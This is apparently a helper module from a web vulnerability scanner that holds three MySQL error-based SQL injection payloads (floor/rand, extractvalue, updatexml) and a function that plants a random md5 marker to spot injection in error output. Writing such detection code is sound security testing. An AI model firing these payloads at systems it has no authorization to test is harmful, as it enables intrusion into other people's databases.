#coding=utf-8
'''
error_sql.py
'''
from misc.common import md5,rand_numbers

error_base_sql_db={
"floor":"(select{test 1}from (select count(*),concat(md5([CHECK_KEY]),floor(rand(0)*2))x from information_schema.tables group by x)a)",
"extractvalue":"(extractvalue(1,concat(0x7e,(select md5(1)),0x7e)))",
"updatexml":"(updatexml(1,concat(0x7e,(select md5(1)),0x7e),1))"
}



def get_error_sql_key(type="floor"):

	num = rand_numbers(2)
	
	sql = error_base_sql_db.get(type).replace("[CHECK_KEY]",num)

	key = md5(num)+"1"
	
	return sql,key
